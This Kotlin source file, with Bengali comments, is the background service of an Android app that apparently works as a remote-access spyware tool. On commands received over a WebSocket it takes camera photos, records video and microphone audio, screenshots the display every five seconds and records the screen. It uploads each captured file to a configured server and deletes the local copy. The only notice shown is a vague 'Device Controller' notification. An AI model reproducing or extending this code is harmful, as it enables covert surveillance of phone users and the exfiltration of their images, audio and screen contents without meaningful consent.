package com.kashem.shaikh

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import com.kashem.shaikh.telegram.*

class ForegroundService : LifecycleService() {

    private val channelId = "ForegroundServiceChannel"
    private val notificationId = 1
    private var webSocketManager: WebSocketManager? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var cameraManager: FrontCameraManager? = null
    private var videoRecorderManager: VideoRecorderManager? = null
    private var audioRecorderManager: AudioRecorderManager? = null
    private var lastConnectionStatus: Boolean? = null

    // ================== স্ক্রিন ক্যাপচার ==================
    private var screenCaptureMediaProjection: MediaProjection? = null
    private var screenCaptureVirtualDisplay: VirtualDisplay? = null
    private var screenCaptureImageReader: ImageReader? = null
    private var screenCaptureJob: Job? = null
    private var isScreenCaptureRunning = false
    private val captureInterval = 5000L
    private var currentScreenCaptureOrigin: String = "user"
    private var pendingScreenCaptureOrigin: String? = null

    // ================== স্ক্রিন রেকর্ড ==================
    private var screenRecorderMediaProjection: MediaProjection? = null
    private var screenRecorderMediaRecorder: MediaRecorder? = null
    private var screenRecorderVirtualDisplay: VirtualDisplay? = null
    private var isScreenRecording = false
    private var screenRecordFile: File? = null
    private var currentScreenRecordOrigin: String = "user"
    private var pendingScreenRecordOrigin: String? = null

    companion object {
        private var instance: ForegroundService? = null

        fun startFrontCamera(context: Context, origin: String = "user") {
            instance?.cameraManager?.startFrontCamera(origin)
        }
        fun startBackCamera(context: Context, origin: String = "user") {
            instance?.cameraManager?.startBackCamera(origin)
        }
        fun stopCamera(context: Context) { instance?.cameraManager?.stopCamera() }

        fun startVideoMain(context: Context, origin: String = "user") {
            instance?.videoRecorderManager?.startRecording(false, origin)
        }
        fun startVideoSelfie(context: Context, origin: String = "user") {
            instance?.videoRecorderManager?.startRecording(true, origin)
        }
        fun stopVideo(context: Context) { instance?.videoRecorderManager?.stopRecording() }

        fun startExternalAudio(context: Context, duration: Int, origin: String = "user") {
            instance?.audioRecorderManager?.startExternalRecording(duration, origin)
        }
        fun stopAudio(context: Context) {
            instance?.audioRecorderManager?.stopRecording()
        }

        fun startScreenCapture(origin: String = "user") {
            instance?.startScreenCaptureWithPending(origin)
        }
        fun stopScreenCapture() {
            instance?.stopScreenCaptureInternal()
        }

        fun startScreenRecord(origin: String = "user") {
            instance?.startScreenRecordWithPending(origin)
        }
        fun stopScreenRecord() {
            instance?.stopScreenRecordInternal()
        }

        fun setMediaProjection(resultCode: Int, data: Intent, type: String) {
            instance?.setMediaProjectionInternal(resultCode, data, type)
        }

        fun requestMediaProjectionFor(type: String, origin: String = "user") {
            instance?.requestMediaProjectionFor(type, origin)
        }

        fun uploadScreenRecord(file: File, origin: String = "user") {
            instance?.uploadFile(file, "screen_record", origin)
        }
    }

    // ================== লাইফসাইকেল ==================
    override fun onCreate() {
        super.onCreate()
        instance = this
        AppLogs.info("ForegroundService onCreate")

        createNotificationChannel()

        // 🔥 startForeground() চেষ্টা – RECORD_AUDIO চেক সহ
        val started = startForegroundServiceSafely()
        if (!started) {
            AppLogs.warn("ForegroundService could not start as foreground, but continuing as background service")
        }

        initWebSocket()

        cameraManager = FrontCameraManager(applicationContext, this) { file, origin ->
            uploadFile(file, "photo", origin)
        }

        videoRecorderManager = VideoRecorderManager(applicationContext, this) { file, origin ->
            uploadFile(file, "video", origin)
        }

        audioRecorderManager = AudioRecorderManager(applicationContext) { file, origin ->
            uploadFile(file, "audio", origin)
        }

        AppLogs.info("ForegroundService created successfully (foreground=${started})")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        AppLogs.debug("onStartCommand called")
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        AppLogs.info("ForegroundService onDestroy")
        serviceScope.cancel()
        webSocketManager?.disconnect()
        cameraManager?.stopCamera()
        videoRecorderManager?.release()
        audioRecorderManager?.release()
        stopScreenCaptureInternal()
        stopScreenRecordInternal()
        instance = null
        AppLogs.info("ForegroundService destroyed")
    }

    override fun onBind(intent: Intent): IBinder? {
        return super.onBind(intent)
    }

    // ================== প্রাইভেট মেথড ==================

    /**
     * নিরাপদে startForeground() কল করে। Android 14+ এর জন্য RECORD_AUDIO চেক বাধ্যতামূলক।
     * ব্যর্থ হলে false রিটার্ন করে কিন্তু ক্রাশ করে না।
     */
    private fun startForegroundServiceSafely(): Boolean {
        // 🔥 Android 14+ এর জন্য RECORD_AUDIO আবশ্যক
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
                AppLogs.warn("RECORD_AUDIO not granted, cannot start foreground service")
                return false
            }
        }

        return try {
            val intent = Intent(this, ForegroundService::class.java)
            val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)
            val notification = NotificationCompat.Builder(this, channelId)
                .setContentTitle("Device Controller")
                .setContentText("Running in background...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .build()

            startForeground(notificationId, notification)
            AppLogs.info("Foreground service started with notification")
            true
        } catch (e: SecurityException) {
            AppLogs.error("Failed to start foreground service (SecurityException): ${e.message}", e)
            false
        } catch (e: Exception) {
            AppLogs.error("Unexpected error starting foreground: ${e.message}", e)
            false
        }
    }

    private fun setMediaProjectionInternal(resultCode: Int, data: Intent, type: String) {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val projection = projectionManager.getMediaProjection(resultCode, data)
        when (type) {
            "screen_capture" -> {
                screenCaptureMediaProjection = projection
                AppLogs.logMediaProjection("screen_capture", true)
                pendingScreenCaptureOrigin?.let { origin ->
                    AppLogs.debug("Executing pending screen capture with origin=$origin")
                    startScreenCaptureInternal(origin)
                    pendingScreenCaptureOrigin = null
                }
            }
            "screen_recorder" -> {
                screenRecorderMediaProjection = projection
                AppLogs.logMediaProjection("screen_recorder", true)
                pendingScreenRecordOrigin?.let { origin ->
                    AppLogs.debug("Executing pending screen record with origin=$origin")
                    startScreenRecordInternal(origin)
                    pendingScreenRecordOrigin = null
                }
            }
            else -> {
                AppLogs.warn("Unknown projection type: $type")
            }
        }
    }

    private fun requestMediaProjectionFor(type: String, origin: String) {
        AppLogs.debug("Requesting MediaProjection for $type")
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
            putExtra("media_projection_type", type)
            putExtra("media_projection_origin", origin)
        }
        startActivity(intent)
    }

    // ---------- স্ক্রিন ক্যাপচার ----------
    private fun startScreenCaptureWithPending(origin: String) {
        if (screenCaptureMediaProjection == null) {
            AppLogs.debug("ScreenCapture MediaProjection not ready, requesting permission...")
            pendingScreenCaptureOrigin = origin
            requestMediaProjectionFor("screen_capture", origin)
            return
        }
        startScreenCaptureInternal(origin)
    }

    private fun startScreenCaptureInternal(origin: String) {
        if (screenCaptureMediaProjection == null) {
            AppLogs.error("ScreenCapture: MediaProjection not ready")
            return
        }
        if (isScreenCaptureRunning) {
            AppLogs.warn("Screen capture already running")
            return
        }

        currentScreenCaptureOrigin = origin
        isScreenCaptureRunning = true
        startScreenCaptureVirtualDisplay()
        startScreenCapturePeriodic()
        updateNotification("📸 Capturing every 5s...")
        AppLogs.info("Screen capture started (origin=$origin)")
    }

    private fun startScreenCaptureVirtualDisplay() {
        val metrics = DisplayMetrics()
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        windowManager.defaultDisplay.getMetrics(metrics)
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        screenCaptureImageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        screenCaptureVirtualDisplay = screenCaptureMediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            screenCaptureImageReader?.surface, null, null
        )
        AppLogs.debug("VirtualDisplay created for screen capture")
    }

    private fun startScreenCapturePeriodic() {
        screenCaptureJob?.cancel()
        screenCaptureJob = serviceScope.launch {
            while (isScreenCaptureRunning) {
                captureScreenshot()
                delay(captureInterval)
            }
        }
    }

    private fun captureScreenshot() {
        val reader = screenCaptureImageReader ?: return
        val image = reader.acquireLatestImage() ?: return
        try {
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * image.width

            val bitmap = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)
            val finalBitmap = Bitmap.createBitmap(bitmap, 0, 0, image.width, image.height)
            image.close()

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(System.currentTimeMillis())
            val file = File(cacheDir, "screenshot_$timestamp.jpg")
            FileOutputStream(file).use { out ->
                finalBitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
            }
            finalBitmap.recycle()

            uploadFile(file, "screenshot", currentScreenCaptureOrigin)
            AppLogs.debug("Screenshot captured: ${file.name}")
        } catch (e: Exception) {
            AppLogs.error("Screenshot capture failed", e)
        }
    }

    private fun stopScreenCaptureInternal() {
        if (!isScreenCaptureRunning) return
        isScreenCaptureRunning = false
        screenCaptureJob?.cancel()
        screenCaptureVirtualDisplay?.release()
        screenCaptureImageReader?.close()
        screenCaptureVirtualDisplay = null
        screenCaptureImageReader = null
        pendingScreenCaptureOrigin = null
        updateNotification("Idle")
        AppLogs.info("Screen capture stopped")
    }

    // ---------- স্ক্রিন রেকর্ড ----------
    private fun startScreenRecordWithPending(origin: String) {
        if (screenRecorderMediaProjection == null) {
            AppLogs.debug("ScreenRecorder MediaProjection not ready, requesting permission...")
            pendingScreenRecordOrigin = origin
            requestMediaProjectionFor("screen_recorder", origin)
            return
        }
        startScreenRecordInternal(origin)
    }

    private fun startScreenRecordInternal(origin: String) {
        if (screenRecorderMediaProjection == null) {
            AppLogs.error("ScreenRecorder: MediaProjection not ready")
            return
        }
        if (isScreenRecording) {
            AppLogs.warn("Screen recording already running")
            return
        }

        currentScreenRecordOrigin = origin

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
                AppLogs.error("POST_NOTIFICATIONS permission missing for screen record")
                return
            }
        }

        val metrics = DisplayMetrics()
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        windowManager.defaultDisplay.getMetrics(metrics)
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        val dir = File(getExternalFilesDir(Environment.DIRECTORY_MOVIES), "ScreenRecords")
        if (!dir.exists()) dir.mkdirs()
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(System.currentTimeMillis())
        screenRecordFile = File(dir, "screen_$timestamp.mp4")

        try {
            screenRecorderMediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(5_000_000)
                setOutputFile(screenRecordFile?.absolutePath)
                prepare()
                start()
            }

            screenRecorderVirtualDisplay = screenRecorderMediaProjection?.createVirtualDisplay(
                "ScreenRecorder", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                screenRecorderMediaRecorder?.surface, null, null
            )

            isScreenRecording = true
            updateNotification("🎥 Recording...")
            AppLogs.info("Screen recording started -> ${screenRecordFile?.absolutePath} (origin=$origin)")
        } catch (e: Exception) {
            AppLogs.error("ScreenRecord start error", e)
            stopScreenRecordInternal()
        }
    }

    private fun stopScreenRecordInternal() {
        if (!isScreenRecording) return
        try {
            screenRecorderMediaRecorder?.stop()
            screenRecorderMediaRecorder?.release()
            screenRecorderVirtualDisplay?.release()
            screenRecorderMediaProjection?.stop()
            AppLogs.debug("Screen recording stopped successfully")
        } catch (e: Exception) {
            AppLogs.error("ScreenRecord stop error", e)
        }
        isScreenRecording = false
        screenRecorderMediaRecorder = null
        screenRecorderVirtualDisplay = null
        screenRecorderMediaProjection = null

        screenRecordFile?.let { file ->
            if (file.exists() && file.length() > 0) {
                AppLogs.debug("Screen record saved, size=${file.length()}")
                uploadFile(file, "screen_record", currentScreenRecordOrigin)
            } else {
                file?.delete()
                AppLogs.warn("Screen record file empty or missing")
            }
        }
        screenRecordFile = null
        pendingScreenRecordOrigin = null
        updateNotification("Idle")
        AppLogs.info("Screen recording stopped")
    }

    // ---------- ফাইল আপলোড ----------
    private fun uploadFile(file: File, type: String, origin: String = "user") {
        val urls = ConfigManager.getServerUrls(applicationContext)
        if (urls != null) {
            val (host, _) = urls
            AppLogs.debug("Uploading $type: ${file.absolutePath}, size=${file.length()}, origin=$origin")
            FileUploader.uploadFile(applicationContext, file, host, origin) { success ->
                if (success) {
                    AppLogs.logFileUpload(file.name, true, origin = origin)
                    file.delete()
                } else {
                    AppLogs.logFileUpload(file.name, false, "Upload failed", origin)
                }
            }
        } else {
            AppLogs.error("Config missing, cannot upload $type")
        }
    }

    // ---------- নোটিফিকেশন ----------
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Foreground Service Channel", NotificationManager.IMPORTANCE_DEFAULT)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
            AppLogs.debug("Notification channel created")
        }
    }

    private fun updateNotification(text: String) {
        try {
            val notification = NotificationCompat.Builder(this, channelId)
                .setContentTitle("Device Controller")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build()
            getSystemService(NotificationManager::class.java).notify(notificationId, notification)
        } catch (e: Exception) {
            AppLogs.debug("Notification update failed: ${e.message}")
        }
    }

    // ---------- WebSocket ----------
    private fun initWebSocket() {
        webSocketManager = WebSocketManager(applicationContext,
            onMessage = { message ->
                serviceScope.launch {
                    AppLogs.debug("WebSocket message received, forwarding to CommandProcessor")
                    CommandProcessor.processCommand(message, applicationContext)
                }
            },
            onConnectionChange = { isConnected ->
                if (lastConnectionStatus != isConnected) {
                    lastConnectionStatus = isConnected
                    updateNotification(if (isConnected) "Connected" else "Disconnected")
                    AppLogs.logWebSocketConnection(isConnected)
                }
            }
        )
        webSocketManager?.connect()
        AppLogs.info("WebSocketManager initialized")
    }
}